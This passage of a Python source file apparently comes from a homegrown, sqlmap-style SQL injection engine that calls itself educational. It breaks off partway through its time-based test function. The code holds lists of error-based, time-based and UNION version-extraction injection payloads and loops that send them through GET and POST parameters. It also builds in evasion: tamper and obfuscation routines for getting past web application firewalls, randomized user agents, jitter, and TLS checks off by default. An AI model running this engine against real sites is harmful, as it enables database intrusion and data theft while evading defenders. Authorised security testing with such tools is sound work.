"""
SQL Injection Detection and Exploitation Engine

Pure Python implementation of SQL injection detection and exploitation techniques.
Inspired by SQLMAP but implemented from scratch for educational and testing purposes.

Enhanced with:
- Advanced payload library (1000+ payloads)
- Adaptive bypass engine with real-time learning
- Fuzzy logic detection for false positive reduction
- False positive reduction
- Impact demonstration
- Automated exploitation
- Enhanced stealth features
"""

import requests
import time
import random
import re
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse
from typing import Dict, List, Optional, Tuple, Any
import json
import logging

# Import new modules
from .advanced_payloads import AdvancedPayloadLibrary
from .false_positive_filter import FalsePositiveFilter
from .impact_demonstrator import ImpactDemonstrator
from .stealth_engine import StealthEngine
from .tamper_scripts import TamperEngine
from .polyglot_payloads import PolyglotEngine
from .adaptive_waf_bypass import WAFDetector, AdaptiveBypassEngine
from .database_fingerprinting import AdvancedDatabaseFingerprinter, DatabaseType
from .privilege_escalation import AdvancedPrivilegeEscalation
from .boolean_blind_detector import BooleanBlindDetector
from .payload_optimizer import PayloadOptimizer
from .report_generator import ReportGenerator
from .cognitive_attack_planner import CognitiveAttackPlanner, AttackObjective
from .smart_context_analyzer import SmartContextAnalyzer
from .advanced_learning_system import AdvancedLearningSystem
from .comprehensive_input_tester import ComprehensiveInputTester
from .bypass_techniques import AdvancedBypassEngine as BypassEngine, DBMSType

# Import new advanced modules
from .adaptive_payload_selector import AdaptivePayloadSelector, ResponseClass
from .fuzzy_logic_detector import FuzzyLogicDetector
from .payload_integration import PayloadIntegration

# Import HTTP utilities (response classification, backoff, circuit breaker)
from .http_utils import (
    classify_response,
    CircuitBreaker,
    CircuitOpenError,
    compute_backoff,
    get_retry_after,
    ALLOWED,
    BLOCKED,
    RATE_LIMITED,
    CHALLENGE,
    AUTH_REQUIRED,
    TRANSIENT_ERROR,
)

# Configure logging
logger = logging.getLogger(__name__)


class SQLInjectionEngine:
    """
    Core engine for SQL injection detection and exploitation.
    """
    
    # User agent strings for randomization
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)',
    ]
    
    # Error-based SQL injection payloads
    ERROR_BASED_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "') OR ('1'='1",
        "\") OR (\"1\"=\"1",
        "' AND '1'='2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 'x'='x",
        "') OR ('x')=('x",
        "' OR '1'='1' --",
        "' OR '1'='1' ({",
        "' OR '1'='1' /*",
    ]
    
    # Time-based blind SQL injection payloads
    TIME_BASED_PAYLOADS = {
        'mysql': [
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1 AND SLEEP(5)",
            "') AND SLEEP(5)--",
        ],
        'postgresql': [
            "' AND pg_sleep(5)--",
            "1' AND pg_sleep(5)--",
            "' OR pg_sleep(5)--",
        ],
        'mssql': [
            "'; WAITFOR DELAY '00:00:05'--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "' WAITFOR DELAY '00:00:05'--",
        ],
        'oracle': [
            "' AND DBMS_LOCK.SLEEP(5)--",
            "1' AND DBMS_LOCK.SLEEP(5)--",
        ],
    }
    
    # SQL error signatures for different databases
    SQL_ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQL Query fail.*",
        r"SQL syntax.*MariaDB",
        
        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        
        # MSSQL
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"Unclosed quotation mark after the character string",
        r"\[SQL Server\]",
        r"ODBC SQL Server Driver",
        
        # Oracle
        r"ORA-[0-9]{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        
        # SQLite
        r"SQLite/JDBCDriver",
        r"SQLite.Exception",
        r"System.Data.SQLite.SQLiteException",
        
        # Generic
        r"SQLSTATE\[",
        r"Syntax error.*SQL",
        r"SQL.*error",
        r"Database error",
        r"mysql_fetch",
    ]
    
    # Database version extraction payloads
    VERSION_EXTRACTION_PAYLOADS = {
        'mysql': "' UNION SELECT @@version--",
        'postgresql': "' UNION SELECT version()--",
        'mssql': "' UNION SELECT @@version--",
        'oracle': "' UNION SELECT banner FROM v$version--",
        'sqlite': "' UNION SELECT sqlite_version()--",
    }
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize the SQL injection engine with configuration.
        
        Args:
            config: Configuration dictionary containing:
                - use_random_delays: bool
                - min_delay: float
                - max_delay: float
                - randomize_user_agent: bool
                - use_payload_obfuscation: bool
                - verify_ssl: bool (default: False)
                - enable_advanced_payloads: bool (default: True)
                - enable_false_positive_reduction: bool (default: True)
                - enable_impact_demonstration: bool (default: True)
                - enable_stealth: bool (default: True)
                - max_requests_per_minute: int (default: 20)
                - enable_jitter: bool (default: True)
                - randomize_headers: bool (default: True)
                - max_retries: int (default: 3)
        """
        self.config = config
        self.session = requests.Session()
        self.results = []
        
        # Initialize new modules
        self.fp_filter = FalsePositiveFilter()
        self.impact_demo = ImpactDemonstrator(self)
        self.advanced_payloads = AdvancedPayloadLibrary()
        
        # Initialize stealth engine (NEW)
        self.stealth = StealthEngine(config) if config.get('enable_stealth', True) else None
        
        # Initialize EXTREMELY ADVANCED modules (NEWEST)
        self.tamper_engine = TamperEngine()
        self.polyglot_engine = PolyglotEngine()
        self.waf_detector = WAFDetector()
        self.adaptive_bypass = AdaptiveBypassEngine(self.tamper_engine, self.polyglot_engine)
        
        # Initialize REDESIGN modules
        self.db_fingerprinter = AdvancedDatabaseFingerprinter()
        self.priv_escalation = AdvancedPrivilegeEscalation()
        
        # Initialize ENHANCEMENT modules (extremely super good!)
        self.boolean_detector = BooleanBlindDetector()
        self.payload_optimizer = PayloadOptimizer()
        self.report_generator = ReportGenerator()
        
        # Initialize SUPER INTELLIGENT modules (extra much more super intelligent!)
        self.cognitive_planner = CognitiveAttackPlanner()
        self.context_analyzer = SmartContextAnalyzer()
        self.learning_system = AdvancedLearningSystem()
        
        # Initialize COMPREHENSIVE INPUT TESTING module (NEW!)
        self.comprehensive_tester = ComprehensiveInputTester(self)
        
        # Initialize ADVANCED BYPASS TECHNIQUES module (LATEST!)
        self.bypass_engine = BypassEngine()
        
        # Initialize ULTIMATE ENHANCEMENT modules (NEWEST - 1000+ PAYLOADS!)
        self.adaptive_selector = AdaptivePayloadSelector(
            learning_rate=config.get('learning_rate', 0.1)
        )
        self.fuzzy_detector = FuzzyLogicDetector(
            similarity_threshold=config.get('similarity_threshold', 0.85),
            confidence_threshold=config.get('confidence_threshold', 0.70)
        )
        self.payload_integration = PayloadIntegration(
            storage_path=config.get('payload_storage_path', 'sql_attacker/payloads')
        )
        
        # Generate comprehensive payloads if enabled
        if config.get('enable_comprehensive_payloads', True):
            logger.info("Loading comprehensive payload library...")
            self.payload_integration.generate_comprehensive_payloads()
            logger.info(f"Loaded {len(self.payload_integration.payloads)} payloads")
        
        # Enable features based on config
        self.use_advanced_payloads = config.get('enable_advanced_payloads', True)
        self.use_fp_reduction = config.get('enable_false_positive_reduction', True)
        self.use_impact_demo = config.get('enable_impact_demonstration', True)
        self.use_adaptive_bypass = config.get('enable_adaptive_bypass', True)
        self.use_polyglot_payloads = config.get('enable_polyglot_payloads', True)
        self.use_fingerprinting = config.get('enable_fingerprinting', True)
        self.use_priv_escalation = config.get('enable_privilege_escalation', True)
        self.use_boolean_blind = config.get('enable_boolean_blind', True)
        self.use_payload_optimization = config.get('enable_payload_optimization', True)
        self.use_cognitive_planning = config.get('enable_cognitive_planning', True)
        self.use_context_analysis = config.get('enable_context_analysis', True)
        self.use_advanced_learning = config.get('enable_advanced_learning', True)
        self.use_comprehensive_testing = config.get('enable_comprehensive_testing', True)
        self.use_bypass_techniques = config.get('enable_bypass_techniques', True)

        # Initialize circuit breaker for responsible scan hygiene
        self._circuit_breaker = CircuitBreaker(
            threshold=config.get('circuit_breaker_threshold', 5),
            reset_after=config.get('circuit_breaker_reset_after', 60.0),
        )
        # Track last classification per host (for reporting)
        self._last_classification: Dict[str, object] = {}
        # Configurable backoff settings
        self._backoff_base = config.get('backoff_base', 2.0)
        self._backoff_cap = config.get('backoff_cap', 60.0)
        self._max_rate_limit_retries = config.get('max_rate_limit_retries', 3)

    def _get_headers(self, custom_headers: Optional[Dict] = None) -> Dict:
        """Get request headers with optional randomization."""
        headers = custom_headers.copy() if custom_headers else {}
        
        # Use stealth engine for header randomization if available
        if self.stealth:
            headers = self.stealth.get_randomized_headers(headers)
        elif self.config.get('randomize_user_agent', True):
            headers['User-Agent'] = random.choice(self.USER_AGENTS)
        
        return headers
    
    def _apply_delay(self):
        """Apply random delay if configured, with stealth enhancements."""
        # Use stealth engine for rate limiting and jitter
        if self.stealth:
            self.stealth.apply_rate_limiting()
        
        # Apply traditional random delays if configured
        if self.config.get('use_random_delays', False):
            base_delay = random.uniform(
                self.config.get('min_delay', 0.5),
                self.config.get('max_delay', 2.0)
            )
            
            # Apply jitter if stealth engine is available
            if self.stealth:
                delay = self.stealth.get_timing_with_jitter(base_delay)
            else:
                delay = base_delay
            
            time.sleep(delay)
    
    def _obfuscate_payload(self, payload: str) -> str:
        """
        Apply advanced obfuscation to payload to evade WAF.
        Now uses the comprehensive tamper script system.
        """
        if not self.config.get('use_payload_obfuscation', False):
            return payload
        
        # Use adaptive bypass if enabled
        if self.use_adaptive_bypass:
            # Apply random tamper script
            tampered = self.tamper_engine.apply_random_tamper(payload, count=1)
            return tampered
        
        # Fallback to simple obfuscation techniques
        obfuscations = [
            lambda p: p.replace(' ', '/**/'),  # Replace spaces with comments
            lambda p: p.replace('OR', 'OR/**/'),  # Add comments
            lambda p: p.replace('AND', 'AND/**/'),
            lambda p: p.replace('=', '/*!50000=*/'),  # Version-specific comments
        ]
        
        # Apply random obfuscation
        if random.random() > 0.5:
            obfuscation = random.choice(obfuscations)
            return obfuscation(payload)
        
        return payload
    
    def _get_adaptive_bypass_payloads(self, original_payload: str, 
                                      baseline_response=None,
                                      max_variations: int = 10) -> List[str]:
        """
        Get adaptive bypass payload variations based on WAF detection.
        This is the EXTREMELY ADVANCED feature that adapts to WAF behavior.
        Now includes advanced bypass techniques from bypass_techniques module.
        
        Args:
            original_payload: Original SQL injection payload
            baseline_response: Baseline response for WAF detection
            max_variations: Maximum number of variations to generate
        
        Returns:
            List of bypass payload variations
        """
        if not self.use_adaptive_bypass:
            return [original_payload]
        
        # Detect WAF from baseline response
        detected_waf, confidence = self.waf_detector.detect_waf(baseline_response) if baseline_response else (None, 0.0)
        
        if detected_waf and confidence > 0.5:
            logger.info(f"WAF detected: {detected_waf} (confidence: {confidence:.2f})")
        
        # Allocate variations budget across different techniques
        # 40% for existing adaptive bypass, 40% for new bypass techniques, 20% for polyglots
        existing_bypass_budget = max(1, int(max_variations * 0.4))
        bypass_techniques_budget = max(1, int(max_variations * 0.4))
        polyglot_budget = max(1, int(max_variations * 0.2))
        
        # Get adaptive bypass payloads from existing system
        bypass_payloads = self.adaptive_bypass.get_bypass_payloads(
            original_payload, 
            detected_waf=detected_waf,
            max_variations=existing_bypass_budget
        )
        
        # Add advanced bypass technique variants (NEW!)
        if self.use_bypass_techniques:
            bypass_variants = self._get_bypass_technique_variants(
                original_payload,
                max_variants=bypass_techniques_budget
            )
            bypass_payloads.extend(bypass_variants)
        
        # Add polyglot payloads if enabled
        if self.use_polyglot_payloads:
            # Get context-agnostic polyglots
            polyglots = self.polyglot_engine.get_context_agnostic()[:polyglot_budget]
            bypass_payloads.extend(polyglots)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload in bypass_payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)
        
        # Ensure we don't exceed max_variations
        return unique_payloads[:max_variations]
    
    def _get_bypass_technique_variants(self, original_payload: str, 
                                      max_variants: int = 20) -> List[str]:
        """
        Generate bypass technique variants using the new bypass_techniques module.
        
        This method generates payloads using:
        - String construction without quotes (CHR/CHAR functions)
        - Comment-based whitespace replacement
        - Keyword obfuscation (mixed casing, hex encoding, repetition)
        - Encoding techniques (double encoding, partial encoding)
        
        Args:
            original_payload: Original SQL injection payload
            max_variants: Maximum number of variants to generate
            
        Returns:
            List of bypass payload variants
        """
        if not self.use_bypass_techniques:
            return []
        
        # Auto-detect DBMS if fingerprinting is enabled
        if self.use_fingerprinting and hasattr(self, 'detected_db_type') and self.detected_db_type:
            # Map DatabaseType to DBMSType
            dbms_mapping = {
                DatabaseType.MYSQL: DBMSType.MYSQL,
                DatabaseType.POSTGRESQL: DBMSType.POSTGRESQL,
                DatabaseType.MSSQL: DBMSType.MSSQL,
                DatabaseType.ORACLE: DBMSType.ORACLE,
                DatabaseType.SQLITE: DBMSType.SQLITE,
            }
            dbms = dbms_mapping.get(self.detected_db_type, DBMSType.UNKNOWN)
            self.bypass_engine.set_dbms(dbms)
            logger.debug(f"Configured bypass engine for detected DBMS: {dbms}")
        
        # Generate all bypass variants
        variants = self.bypass_engine.generate_all_bypass_variants(
            original_payload, 
            max_variants=max_variants
        )
        
        logger.debug(f"Generated {len(variants)} bypass technique variants")
        return variants
    
    def _test_with_adaptive_bypass(self, url: str, method: str,
                                   param_name: str, param_value: str,
                                   param_type: str,
                                   params: Optional[Dict] = None,
                                   data: Optional[Dict] = None,
                                   cookies: Optional[Dict] = None,
                                   headers: Optional[Dict] = None,
                                   baseline_response=None) -> Optional[Dict]:
        """
        Test parameter with adaptive WAF bypass techniques.
        This uses tamper scripts, polyglot payloads, and WAF-specific bypasses.
        
        Returns:
            Finding dict if vulnerability detected, None otherwise
        """
        if not self.use_adaptive_bypass:
            return None
        
        # Start with basic test payload
        test_payloads = ["' OR '1'='1'--", "' AND '1'='1'--"]
        
        # Generate adaptive bypass variations
        bypass_variations = []
        for base_payload in test_payloads[:1]:  # Use first payload for variations
            variations = self._get_adaptive_bypass_payloads(
                base_payload,
                baseline_response=baseline_response,
                max_variations=5
            )
            bypass_variations.extend(variations)
        
        logger.info(f"Testing {param_name} with {len(bypass_variations)} adaptive bypass variations")
        
        # Test each variation
        for payload in bypass_variations:
            # Prepare request
            if param_type == 'GET':
                test_params = params.copy() if params else {}
                test_params[param_name] = str(param_value) + payload
                response = self._make_request(url, method, test_params, data, cookies, headers)
            elif param_type == 'POST':
                test_data = data.copy() if data else {}
                test_data[param_name] = str(param_value) + payload
                response = self._make_request(url, method, params, test_data, cookies, headers)
            else:
                continue
            
            if not response:
                continue
            
            # Check for SQL errors
            error_pattern = self._check_sql_errors(response)
            if error_pattern:
                # Check if response indicates WAF bypass
                is_waf_blocked = self.waf_detector.is_waf_response(response, baseline_response)
                
                if not is_waf_blocked:
                    # Success! Record this bypass technique
                    detected_waf, _ = self.waf_detector.detect_waf(baseline_response) if baseline_response else (None, 0.0)
                    if detected_waf:
                        self.adaptive_bypass.record_success(detected_waf, 'adaptive', payload)
                    
                    logger.info(f"Adaptive bypass successful with payload: {payload[:50]}...")
                    
                    # Return finding
                    db_type = self._detect_database_type(response.text)
                    return {
                        'injection_type': 'error_based_adaptive',
                        'vulnerable_parameter': param_name,
                        'parameter_type': param_type,
                        'test_payload': payload,
                        'detection_evidence': f'SQL error pattern matched with adaptive bypass: {error_pattern}',
                        'database_type': db_type or 'unknown',
                        'bypass_technique': 'adaptive_waf_bypass',
                        'response': response,
                    }
        
        return None
    
    def _make_request(self, url: str, method: str = 'GET', 
                     params: Optional[Dict] = None,
                     data: Optional[Dict] = None,
                     cookies: Optional[Dict] = None,
                     headers: Optional[Dict] = None,
                     timeout: int = 30) -> Optional[requests.Response]:
        """
        Make HTTP request with error handling, response classification,
        adaptive backoff on rate-limiting, and circuit-breaker protection.

        The circuit-breaker key is derived from the URL host so that
        repeated blocks/challenges for the same host abort further tests.
        """
        host_key = urlparse(url).netloc or url

        # Check circuit breaker before sending request
        if self._circuit_breaker.is_open(host_key):
            logger.warning(
                f"Circuit breaker is open for '{host_key}'. Skipping request."
            )
            return None

        # Merge cookies with session cookies if stealth engine is available
        if self.stealth:
            merged_cookies = self.stealth.get_session_cookies()
            if cookies:
                merged_cookies.update(cookies)
            cookies = merged_cookies

        max_stealth_retries = self.stealth.max_retries if self.stealth else 0
        rate_limit_attempts = 0
        attempt = 0
        last_exception = None

        while attempt <= max_stealth_retries:
            try:
                self._apply_delay()
                request_headers = self._get_headers(headers)

                verify_ssl = self.config.get('verify_ssl', False)

                if method.upper() == 'GET':
                    response = self.session.get(
                        url,
                        params=params,
                        cookies=cookies,
                        headers=request_headers,
                        timeout=timeout,
                        verify=verify_ssl,
                        allow_redirects=True
                    )
                elif method.upper() == 'POST':
                    response = self.session.post(
                        url,
                        params=params,
                        data=data,
                        cookies=cookies,
                        headers=request_headers,
                        timeout=timeout,
                        verify=verify_ssl,
                        allow_redirects=True
                    )
                else:
                    # Support other HTTP methods
                    response = self.session.request(
                        method,
                        url,
                        params=params,
                        data=data,
                        cookies=cookies,
                        headers=request_headers,
                        timeout=timeout,
                        verify=verify_ssl,
                        allow_redirects=True
                    )

                # Update session cookies if stealth engine is available
                if self.stealth:
                    self.stealth.update_session_cookies(response)

                # Classify the response and record it
                classification = classify_response(response)
                self._last_classification[host_key] = classification
                # Attach classification to response for callers
                try:
                    response._megido_classification = classification
                except Exception:
                    pass

                outcome = classification.outcome

                if outcome == RATE_LIMITED:
                    retry_after = get_retry_after(response, default=self._backoff_base)
                    backoff = max(
                        retry_after,
                        compute_backoff(rate_limit_attempts, self._backoff_base, self._backoff_cap),
                    )
                    self._circuit_breaker.record(host_key, outcome)
                    if rate_limit_attempts < self._max_rate_limit_retries:
                        logger.warning(
                            f"Rate limited on '{host_key}' "
                            f"(attempt {rate_limit_attempts + 1}). "
                            f"Backing off {backoff:.1f}s. "
                            f"Evidence: {classification.evidence}"
                        )
                        time.sleep(backoff)
                        rate_limit_attempts += 1
                        # Don't increment stealth attempt counter -- this is a
                        # separate rate-limit retry loop.
                        continue
                    else:
                        logger.error(
                            f"Rate limited on '{host_key}' -- max retries reached."
                        )
                        return response

                elif outcome in (BLOCKED, CHALLENGE):
                    self._circuit_breaker.record(host_key, outcome)
                    if self._circuit_breaker.is_open(host_key):
                        logger.warning(
                            f"Circuit breaker opened for '{host_key}': "
                            f"{classification.reason}. Evidence: {classification.evidence}"
                        )
                        return response
                    else:
                        logger.info(
                            f"Request {outcome} for '{host_key}': "
                            f"{classification.reason}"
                        )
                        return response

                elif outcome == AUTH_REQUIRED:
                    self._circuit_breaker.record(host_key, ALLOWED)  # not a block
                    logger.info(
                        f"Auth required for '{host_key}': {classification.reason}"
                    )
                    return response

                elif outcome == TRANSIENT_ERROR:
                    self._circuit_breaker.record(host_key, ALLOWED)
                    # Fall through to stealth retry logic below

                else:
                    # ALLOWED
                    self._circuit_breaker.record(host_key, ALLOWED)
                    return response

            except Exception as e:
                last_exception = e
                logger.error(f"Request error (attempt {attempt + 1}): {e}")

                # Classify connection failure
                classification = classify_response(None)
                self._last_classification[host_key] = classification

            # Check if should retry (stealth engine or transient error)
            if self.stealth and self.stealth.should_retry(attempt, None, last_exception):
                retry_delay = self.stealth.get_retry_delay(attempt)
                logger.info(f"Retrying after {retry_delay:.2f}s...")
                time.sleep(retry_delay)
                attempt += 1
            else:
                break

        return None

    
    def _check_sql_errors(self, response: requests.Response) -> Optional[str]:
        """
        Check if response contains SQL error messages.
        
        Returns:
            Error pattern matched or None
        """
        if not response:
            return None
        
        response_text = response.text
        
        for pattern in self.SQL_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return pattern
        
        return None
    
    def _detect_database_type(self, error_message: str) -> Optional[str]:
        """Detect database type from error message."""
        if re.search(r'MySQL|MariaDB', error_message, re.IGNORECASE):
            return 'mysql'
        elif re.search(r'PostgreSQL|pg_', error_message, re.IGNORECASE):
            return 'postgresql'
        elif re.search(r'SQL Server|MSSQL', error_message, re.IGNORECASE):
            return 'mssql'
        elif re.search(r'Oracle|ORA-', error_message, re.IGNORECASE):
            return 'oracle'
        elif re.search(r'SQLite', error_message, re.IGNORECASE):
            return 'sqlite'
        
        return None

    def _get_response_classification(
        self, response: Optional[requests.Response]
    ):
        """Return the classification attached to *response* (if any), or classify now."""
        if response is None:
            from .http_utils import classify_response as _cr
            return _cr(None)
        return getattr(response, '_megido_classification', None) or classify_response(response)

    def _make_protection_finding(
        self, url: str, param_name: str, param_type: str, classification
    ) -> Dict:
        """Build a finding dict representing a protection-layer block/challenge."""
        return {
            'injection_type': 'protection_layer',
            'vulnerable_parameter': param_name,
            'parameter_type': param_type,
            'test_payload': None,
            'detection_evidence': (
                f"Scanning blocked by protection layer: {classification.reason}"
            ),
            'database_type': 'unknown',
            'protection_outcome': classification.outcome,
            'protection_vendor': classification.vendor,
            'protection_evidence': classification.evidence,
            'request_data': {'url': url},
            'confidence_score': 1.0,
        }

    def test_error_based_sqli(self, url: str, method: str,
                              params: Optional[Dict] = None,
                              data: Optional[Dict] = None,
                              cookies: Optional[Dict] = None,
                              headers: Optional[Dict] = None) -> List[Dict]:
        """
        Test for error-based SQL injection vulnerabilities.
        Enhanced with advanced payloads and false positive reduction.
        
        Returns:
            List of vulnerability findings
        """
        findings = []
        
        # Get baseline response for false positive filtering
        baseline_response = self._make_request(url, method, params, data, cookies, headers)
        if not baseline_response:
            return findings

        # If baseline itself was blocked, emit a protection finding immediately
        baseline_cls = self._get_response_classification(baseline_response)
        if baseline_cls.outcome in (BLOCKED, CHALLENGE, RATE_LIMITED, AUTH_REQUIRED):
            param_names = list((params or {}).keys()) + list((data or {}).keys())
            for pname in (param_names or ['(baseline)']):
                ptype = 'GET' if params and pname in params else 'POST'
                findings.append(self._make_protection_finding(url, pname, ptype, baseline_cls))
            return findings

        # Set baseline for false positive filter
        if self.use_fp_reduction:
            self.fp_filter.set_baseline(baseline_response)
        
        # Determine payloads to use
        base_payloads = self.ERROR_BASED_PAYLOADS
        if self.use_advanced_payloads:
            base_payloads = base_payloads + self.advanced_payloads.WAF_BYPASS_PAYLOADS[:10]
        
        # Test GET parameters
        if params:
            for param_name, param_value in params.items():
                param_findings = []
                
                for payload in base_payloads:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param_name] = str(param_value) + obfuscated_payload
                    
                    response = self._make_request(url, method, test_params, data, cookies, headers)
                    
                    if response:
                        # Check if this response was blocked by a protection layer
                        cls = self._get_response_classification(response)
                        if cls.outcome in (BLOCKED, CHALLENGE, RATE_LIMITED, AUTH_REQUIRED):
                            findings.append(
                                self._make_protection_finding(url, param_name, 'GET', cls)
                            )
                            break  # Stop testing this parameter

                        error_pattern = self._check_sql_errors(response)
                        if error_pattern:
                            # Check for false positive
                            if self.use_fp_reduction and self.fp_filter.is_likely_false_positive(response, payload):
                                logger.debug(f"Likely false positive detected for {param_name}, skipping")
                                continue
                            
                            db_type = self._detect_database_type(response.text)
                            finding = {
                                'injection_type': 'error_based',
                                'vulnerable_parameter': param_name,
                                'parameter_type': 'GET',
                                'test_payload': test_params[param_name],
                                'detection_evidence': f'SQL error pattern matched: {error_pattern}',
                                'database_type': db_type or 'unknown',
                                'request_data': {
                                    'url': url,
                                    'method': method,
                                    'params': test_params,
                                },
                                'response_data': {
                                    'status_code': response.status_code,
                                    'body_snippet': response.text[:500],
                                },
                                'response': response,  # Store for confidence calc
                            }
                            param_findings.append(finding)
                            
                            # Found vulnerability, test a few more payloads for confirmation
                            if len(param_findings) >= 2:
                                break
                
                # If multiple payloads confirmed, calculate confidence
                if param_findings:
                    if self.use_fp_reduction and len(param_findings) >= 2:
                        # Multiple confirmation increases confidence
                        confidence = self.fp_filter.calculate_confidence_score(
                            param_findings[0]['response'],
                            param_findings[0]['test_payload'],
                            param_findings[0]['detection_evidence'],
                            multiple_payloads_confirmed=True
                        )
                    else:
                        confidence = self.fp_filter.calculate_confidence_score(
                            param_findings[0]['response'],
                            param_findings[0]['test_payload'],
                            param_findings[0]['detection_evidence'],
                            multiple_payloads_confirmed=False
                        ) if self.use_fp_reduction else 0.7
                    
                    # Add first finding with confidence
                    finding = param_findings[0]
                    finding['confidence_score'] = confidence
                    finding.pop('response', None)  # Remove response object before storing
                    
                    # Only add if confidence is high enough
                    if confidence >= 0.5:
                        findings.append(finding)
                        logger.info(f"Confirmed SQL injection in {param_name} (confidence: {confidence:.2f})")
                
                # If no findings with normal payloads, try adaptive bypass
                if not param_findings and self.use_adaptive_bypass:
                    logger.info(f"Trying adaptive WAF bypass for parameter: {param_name}")
                    adaptive_finding = self._test_with_adaptive_bypass(
                        url, method, param_name, param_value, 'GET',
                        params, data, cookies, headers, baseline_response
                    )
                    if adaptive_finding:
                        adaptive_finding['confidence_score'] = 0.85  # High confidence for successful bypass
                        adaptive_finding.pop('response', None)
                        findings.append(adaptive_finding)
                        logger.info(f"✓ Adaptive bypass successful for {param_name}")
        
        # Test POST parameters (similar logic)
        if data and method.upper() == 'POST':
            for param_name, param_value in data.items():
                param_findings = []
                
                for payload in base_payloads:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_data = data.copy()
                    test_data[param_name] = str(param_value) + obfuscated_payload
                    
                    response = self._make_request(url, method, params, test_data, cookies, headers)
                    
                    if response:
                        error_pattern = self._check_sql_errors(response)
                        if error_pattern:
                            if self.use_fp_reduction and self.fp_filter.is_likely_false_positive(response, payload):
                                continue
                            
                            db_type = self._detect_database_type(response.text)
                            finding = {
                                'injection_type': 'error_based',
                                'vulnerable_parameter': param_name,
                                'parameter_type': 'POST',
                                'test_payload': test_data[param_name],
                                'detection_evidence': f'SQL error pattern matched: {error_pattern}',
                                'database_type': db_type or 'unknown',
                                'request_data': {
                                    'url': url,
                                    'method': method,
                                    'data': test_data,
                                },
                                'response_data': {
                                    'status_code': response.status_code,
                                    'body_snippet': response.text[:500],
                                },
                                'response': response,
                            }
                            param_findings.append(finding)
                            
                            if len(param_findings) >= 2:
                                break
                
                if param_findings:
                    confidence = self.fp_filter.calculate_confidence_score(
                        param_findings[0]['response'],
                        param_findings[0]['test_payload'],
                        param_findings[0]['detection_evidence'],
                        multiple_payloads_confirmed=len(param_findings) >= 2
                    ) if self.use_fp_reduction else 0.7
                    
                    finding = param_findings[0]
                    finding['confidence_score'] = confidence
                    finding.pop('response', None)
                    
                    if confidence >= 0.5:
                        findings.append(finding)
                
                # If no findings with normal payloads, try adaptive bypass
                if not param_findings and self.use_adaptive_bypass:
                    logger.info(f"Trying adaptive WAF bypass for POST parameter: {param_name}")
                    adaptive_finding = self._test_with_adaptive_bypass(
                        url, method, param_name, param_value, 'POST',
                        params, data, cookies, headers, baseline_response
                    )
                    if adaptive_finding:
                        adaptive_finding['confidence_score'] = 0.85  # High confidence for successful bypass
                        adaptive_finding.pop('response', None)
                        findings.append(adaptive_finding)
                        logger.info(f"✓ Adaptive bypass successful for {param_name}")
        
        return findings
    
    def test_time_based_sqli(self, url: str, method: str,
                             params: Optional[Dict] = None,
                             data: Optional[Dict] = None,
                             cookies: Optional[Dict] = None,
                             headers: Optional[Dict] = None) -> List[Dict]:
        """
        Test for time-based blind SQL injection vulnerabilities.
        
        Returns:
            List of vulnerability findings
        """
        findings = []
        
        # Measure baseline response time
        start_time = time.time()
        baseline_response = self._make_request(url, method, params, data, cookies, headers)
        baseline_time = time.time() - start_time
        
        if not baseline_response:
            return findings
        
        # Test different database types
        for db_type, payloads in self.TIME_BASED_PAYLOADS.items():
            # Test GET parameters
            if params:
                for param_name, param_value in params.items():
                    for payload in payloads[:2]:  # Test first 2 payloads per DB type
                        obfuscated_payload = self._obfuscate_payload(payload)
                        test_params = params.copy()
                        test_params[param_name] = str(param_value) + obfuscated_payload
                        
                        start_time = time.time()
                        response = self._make_request(url, method, test_params, data, cookies, headers)
                        response_time = time.time() - start_time
                        
                        # Check if response was delayed (accounting for network variance)
                        if response and response_time > (baseline_time + 4.0):
                            findings.append({
                                'injection_type': 'time_based',
                                'vulnerable_parameter': param_name,
                                'parameter_type': 'GET',
                                'test_payload': test_params[param_name],
                                'detection_evidence': (
                                    f'Time-based blind SQLi detected. '
                                    f'Baseline: {baseline_time:.2f}s, '
                                    f'Payload: {response_time:.2f}s'
                                ),
                                'database_type': db_type,
                                'request_data': {
                                    'url': url,
                                    'method': method,
                                    'params': test_params,
                                },
                                'response_data': {
                                    'status_code': response.status_code,
                                    'response_time': response_time,
                                }
                            })
                            # Found vulnerability, don't test more payloads for this param
                            break
                    
                    # If found vulnerability for this param, don't test other DB types
                    if findings and findings[-1]['vulnerable_parameter'] == param_name:
                        break
            
            # Test POST parameters
            if data and method.upper() == 'POST':
                for param_name, param_value in data.items():
                    for payload in payloads[:2]:
                        obfuscated_payload = self._obfuscate_payload(payload)
                        test_data = data.copy()
                        test_data[param_name] = str(param_value) + obfuscated_payload
                        
                        start_time = time.time()
                        response = self._make_request(url, method, params, test_data, cookies, headers)
                        response_time = time.time() - start_time
                        
                        if response and response_time > (baseline_time + 4.0):
                            findings.append({
                                'injection_type': 'time_based',
                                'vulnerable_parameter': param_name,
                                'parameter_type': 'POST',
                                'test_payload': test_data[param_name],
                                'detection_evidence': (
                                    f'Time-based blind SQLi detected. '
